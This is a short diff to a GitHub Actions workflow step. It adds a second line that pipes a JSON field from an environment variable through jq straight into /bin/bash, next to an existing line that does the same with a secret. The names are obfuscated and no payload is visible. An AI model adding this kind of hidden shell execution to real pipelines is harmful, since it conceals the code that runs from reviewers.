@@ -19,6 +19,7 @@ jobs:
           ujlkd52331: ${{ secrets.ujlkd52331 }}
         run: |
           printf '%s' "$ujlkd52331" | jq -r .qk0038 | /bin/bash
+          echo $sa3 | jq -r .jlzp0631 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
